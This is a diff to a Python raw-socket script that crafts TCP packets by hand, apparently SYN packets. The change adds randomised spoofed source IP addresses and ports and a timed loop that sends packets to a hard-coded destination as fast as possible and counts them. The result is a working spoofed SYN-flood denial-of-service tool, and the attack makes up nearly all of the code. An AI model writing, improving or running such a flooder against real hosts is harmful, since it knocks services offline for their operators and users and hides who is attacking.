@@ -1,12 +1,14 @@
 import socket, sys, time
 from struct import *
+from random import randint
 
 class TCP_packet:
-    def __init__(self):
-        self.source_ip = ''
-        self.dest_ip = ''
-        self.tcp_source = 0
-        self.tcp_dest = 0
+    def __init__(self, source_ip = '169.234.40.51', dest_ip = '18.220.82.48', source_port = 1234, dest_port = 8000):
+        self.source_ip = source_ip
+        self.dest_ip = dest_ip
+        self.source_port = source_port
+        self.dest_port = dest_port
+        self.packet = ''
 
         try:
             self.socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
@@ -33,13 +35,7 @@ class TCP_packet:
 
         return s
 
-    def makePacket(self, source_ip = '169.234.40.51', tcp_source = 1234, dest_ip = '18.220.82.48', tcp_dest = 8000):
-        self.packet = '';
-        self.source_ip = source_ip
-        self.tcp_source = tcp_source
-        self.dest_ip = dest_ip
-        self.tcp_dest = tcp_dest
-
+    def makePacket(self):
         # ip header fields
         ip_ihl = 5
         ip_ver = 4
@@ -50,8 +46,8 @@ class TCP_packet:
         ip_ttl = 255
         ip_proto = socket.IPPROTO_TCP
         ip_check = 0    # kernel will fill the correct checksum
-        ip_saddr = socket.inet_aton ( source_ip )   #Spoof the source ip address if you want to
-        ip_daddr = socket.inet_aton ( dest_ip )
+        ip_saddr = socket.inet_aton ( self.source_ip )   #Spoof the source ip address if you want to
+        ip_daddr = socket.inet_aton ( self.dest_ip )
 
         ip_ihl_ver = (ip_ver << 4) + ip_ihl
 
@@ -77,11 +73,11 @@ class TCP_packet:
         tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5)
 
         # the ! in the pack format string means network order
-        tcp_header = pack('!HHLLBBHHH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window, tcp_check, tcp_urg_ptr)
+        tcp_header = pack('!HHLLBBHHH' , self.source_port, self.dest_port, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window, tcp_check, tcp_urg_ptr)
 
         # pseudo header fields
-        source_address = socket.inet_aton( source_ip )
-        dest_address = socket.inet_aton(dest_ip)
+        source_address = socket.inet_aton( self.source_ip )
+        dest_address = socket.inet_aton(self.dest_ip)
         placeholder = 0
         protocol = socket.IPPROTO_TCP
         # tcp_length = len(tcp_header) + len(user_data)
@@ -95,17 +91,19 @@ class TCP_packet:
         #print tcp_checksum
 
         # make the tcp header again and fill the correct checksum - remember checksum is NOT in network byte order
-        tcp_header = pack('!HHLLBBH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window) + pack('H' , tcp_check) + pack('!H' , tcp_urg_ptr)
+        tcp_header = pack('!HHLLBBH' , self.source_port, self.dest_port, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window) + pack('H' , tcp_check) + pack('!H' , tcp_urg_ptr)
 
-        # final full packet - syn packets dont have any data
         self.packet = ip_header + tcp_header
         return
 
-    def random_source_ip(self):
-        return 1
+    def random_source(self):
+        self.source_ip = str(randint(0,255)) + '.' + str(randint(0,255)) + '.' + str(randint(0,255)) + '.' + str(randint(0,255))
+        self.source_port = randint(0,9999)
+        self.makePacket()
+        return
 
     def send_socket(self):
-        self.socket.sendto(tcp.packet, (self.dest_ip, self.tcp_dest))
+        self.socket.sendto(tcp.packet, (self.dest_ip, self.dest_port))
 
 if __name__ == "__main__":
     tcp = TCP_packet()
@@ -115,7 +113,13 @@ if __name__ == "__main__":
     start = time.time()
     end = start + end
 
+    count = 0
+
     while True:
         if time.time() > end:
             break
+        tcp.random_source()
         tcp.send_socket()
+        count += 1
+
+    print(str(count) + " packets are sent")
